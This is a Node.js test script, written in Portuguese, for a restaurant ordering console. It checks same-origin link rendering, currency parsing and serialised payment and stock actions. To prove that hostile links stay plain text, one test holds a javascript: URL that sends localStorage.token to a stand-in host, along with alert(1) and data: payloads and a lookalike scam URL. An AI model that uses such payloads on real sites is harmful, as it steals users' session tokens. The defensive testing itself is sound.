/* eslint-disable no-console */
// Prova da #1510 (banca do console): a parte pura dos achados.
//   1. o link do cardápio na bolha só vira trecho clicável quando é http(s) da
//      própria origem do console; `javascript:` e host de fora ficam texto;
//   5. colar "R$ 1.500" no campo de moeda é mil e quinhentos, não R$ 1,50;
//  10. com uma ação da comanda em voo, outra ação na mesma conversa avisa em vez de
//      receber a promessa da primeira e nunca rodar; a MESMA ação segue sem 2º POST.
//
//   node ferramentas/prova-1510-banca-console.mjs

import { registerHooks } from 'node:module'
import assert from 'node:assert/strict'

registerHooks({
  resolve(especificador, contexto, proximo) {
    if (especificador.startsWith('.') && !/\.[a-z]+$/i.test(especificador)) {
      try { return proximo(especificador + '.js', contexto) } catch { /* cai no original */ }
    }
    return proximo(especificador, contexto)
  },
  load(url, contexto, proximo) {
    if (url.endsWith('/infra/fonteDados.js')) {
      return { format: 'module', shortCircuit: true, source: "export const FONTE_API = true\nexport const API_BASE = ''\n" }
    }
    return proximo(url, contexto)
  },
})

const link = await import('../src/dominio/cardapioLink.js')
const { lerMoeda } = await import('../src/dominio/formato.js')

let passou = 0
const falhas = []
const confere = (descricao, fn) => {
  try {
    fn()
    passou += 1
    console.log('ok    ' + descricao)
  } catch (erro) {
    falhas.push(descricao)
    console.log(`FALHA ${descricao}\n      ${String(erro.message).split('\n').filter(Boolean).slice(0, 3).join(' ')}`)
  }
}

// --- 1. Link do cardápio na bolha ---------------------------------------------------
const ORIGEM = 'http://127.0.0.1:5173'
const soLinks = (partes) => partes.filter((p) => p.tipo === 'link').map((p) => p.texto)

confere('convite com o link da própria origem continua clicável', () => {
  const url = link.linkDoCardapio(ORIGEM + '/', 'c7')
  const partes = link.partesComLinkDoCardapio(link.textoConviteCardapio('Norma Lima', url), ORIGEM)
  assert.deepEqual(soLinks(partes), [url])
})

confere('javascript: com o caminho do cardápio no fim não vira link', () => {
  const malicioso = 'javascript:fetch("//x.y/?t="+localStorage.token)//#/cardapio-link/a'
  const partes = link.partesComLinkDoCardapio('olha ' + malicioso, ORIGEM)
  assert.deepEqual(soLinks(partes), [])
  assert.equal(partes.map((p) => p.texto).join(''), 'olha ' + malicioso, 'o texto chega inteiro')
})

confere('JaVaScRiPt: e data: também ficam texto', () => {
  assert.deepEqual(soLinks(link.partesComLinkDoCardapio('JaVaScRiPt:alert(1)//#/cardapio-link/a', ORIGEM)), [])
  assert.deepEqual(soLinks(link.partesComLinkDoCardapio('data:text/html,<b>x</b>#/cardapio-link/a', ORIGEM)), [])
})

confere('http(s) de outro host não vira link (golpe com a cara do cardápio)', () => {
  assert.deepEqual(soLinks(link.partesComLinkDoCardapio('https://golpe.example/#/cardapio-link/c1', ORIGEM)), [])
})

confere('sem origem informada nada vira link', () => {
  assert.deepEqual(soLinks(link.partesComLinkDoCardapio(ORIGEM + '/#/cardapio-link/c1')), [])
})

// --- 5. lerMoeda ----------------------------------------------------------------------
const CASOS_MOEDA = [
  ['1.500', 150000],
  ['R$ 1.500', 150000],
  ['1.500,00', 150000],
  ['1,5', 150],
  ['1500,5', 150050],
  ['1.234.567,89', 123456789],
  ['12,34', 1234],
  ['0,99', 99],
  ['68.50', 6850],
  ['R$ 68,50', 6850],
  ['68', 6800],
]
for (const [texto, centavos] of CASOS_MOEDA) {
  confere(`lerMoeda("${texto}") = ${centavos} centavos`, () => assert.equal(lerMoeda(texto), centavos))
}

// --- 10. Trava da comanda por conversa e ação ------------------------------------------
const { pedidoDaApi } = await import('../src/infra/api/comandaApi.js')
const { criarAcoesComandaApi } = await import('../src/aplicacao/api/comanda.js')

const EM = '2026-10-09T15:00:00Z'
const DADOS = {
  pedidoId: '11111111-1111-1111-1111-111111111111', status: 'aguardando', total: 25, frete: 5, itens: [],
  totalPago: 0, pagamentos: [],
  cobranca: { cobrancaId: 'cb', provedor: 'na_entrega', status: 'Pendente', valor: 25, criadaEm: EM, metodoPagamento: 'dinheiro' },
}
globalThis.sessionStorage = { getItem: () => JSON.stringify({ token: 't', expiraEm: Date.now() + 60000, empresa: { id: 'empresa' } }) }
const chamadas = []
const despachados = []
let liberar
const espera = new Promise((resolve) => { liberar = resolve })
globalThis.fetch = async (url, opcoes = {}) => {
  chamadas.push({ url, method: opcoes.method ?? 'GET' })
  if (opcoes.method === 'POST') await espera
  return new Response(JSON.stringify({ data: DADOS }))
}
const acoesComanda = criarAcoesComandaApi({}, {
  despachar: (a) => despachados.push(a),
  estadoRef: { current: { conversas: [{ id: 'cv', pedido: pedidoDaApi(DADOS) }] } },
})

const primeira = acoesComanda.confirmarPagamento('cv', 25, 'dinheiro')
const repetida = acoesComanda.confirmarPagamento('cv', 25, 'dinheiro')
const outra = acoesComanda.desfazerPagamento('cv', 'Lançamento incorreto')
confere('mesma ação em voo: a repetição recebe a mesma promessa (sem 2º POST)', () => {
  assert.equal(repetida, primeira)
})
confere('outra ação com a primeira em voo não herda a promessa dela e avisa', () => {
  assert.notEqual(outra, primeira)
  assert.ok(despachados.some((a) => /Aguarde a ação anterior/.test(a.mensagem ?? '')), 'aviso na faixa')
})
liberar()
await Promise.all([primeira, repetida, outra])
confere('um só POST de pagamento e nenhum desfazer escondido', () => {
  assert.equal(chamadas.filter((c) => c.method === 'POST' && !c.url.includes('desfazer')).length, 1)
  assert.equal(chamadas.filter((c) => c.url.includes('desfazer')).length, 0)
})
await acoesComanda.desfazerPagamento('cv', 'Lançamento incorreto')
confere('terminada a primeira, a outra ação roda normalmente', () => {
  assert.equal(chamadas.filter((c) => c.url.includes('desfazer')).length, 1)
})

// --- 11. −/+ do saldo em fila por sku ------------------------------------------------------
const { criarAcoesCardapioApi } = await import('../src/aplicacao/api/cardapio.js')
const saldos = []
let liberarSaldo
const portaoSaldo = new Promise((resolve) => { liberarSaldo = resolve })
globalThis.fetch = async (url, { method = 'GET', body } = {}) => {
  if (method === 'POST' && url.endsWith('/saldo')) {
    saldos.push(JSON.parse(body).quantidadeContada)
    await portaoSaldo
    return new Response(JSON.stringify({ data: {} }))
  }
  return new Response(JSON.stringify({ data: { itens: [] } }))
}
// estadoRef parado de propósito: a tela ainda não re-renderizou entre os dois toques.
const acoesCardapio = criarAcoesCardapioApi({
  despachar: () => {},
  estadoRef: { current: { catalogo: { cardapio: [{ sku: 'i-1', nome: 'Lasanha', estoque: 3, disponivelHoje: true }] } } },
})
const mais1 = acoesCardapio.ajustarSaldo('i-1', +1)
const mais2 = acoesCardapio.ajustarSaldo('i-1', +1)
await new Promise((resolve) => setTimeout(resolve, 20))
confere('segundo toque espera o primeiro (um POST de saldo por vez no mesmo sku)', () => {
  assert.equal(saldos.length, 1)
})
liberarSaldo()
await Promise.all([mais1, mais2])
confere('cada toque conta a partir do resultado do anterior: 3 → 4 → 5', () => {
  assert.deepEqual(saldos, [4, 5])
})
const menos = acoesCardapio.ajustarSaldo('i-1', -1)
await menos
confere('fila vazia volta a partir do saldo da tela', () => {
  assert.equal(saldos.at(-1), 2)
})

console.log(`\n${passou} verificações passaram, ${falhas.length} falharam.`)
if (falhas.length) process.exit(1)
